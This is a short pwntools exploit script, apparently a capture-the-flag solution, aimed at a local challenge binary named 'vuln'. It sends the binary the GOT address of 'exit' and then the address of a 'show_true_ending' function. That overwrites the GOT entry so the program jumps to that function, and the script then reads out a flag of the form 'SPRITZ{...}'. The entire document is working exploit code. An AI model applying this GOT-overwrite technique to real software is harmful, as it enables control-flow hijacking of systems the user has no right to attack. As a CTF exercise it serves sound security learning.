from pwn import * 

context.binary = "../vuln"

e: ELF = context.binary  

p = process()
p.sendline(str(e.got["exit"]).encode("ascii"))
p.sendline(str(e.functions["show_true_ending"].address).encode("ascii"))
log.success(p.recvline_regex(rb"SPRITZ{.*}").decode("ascii"))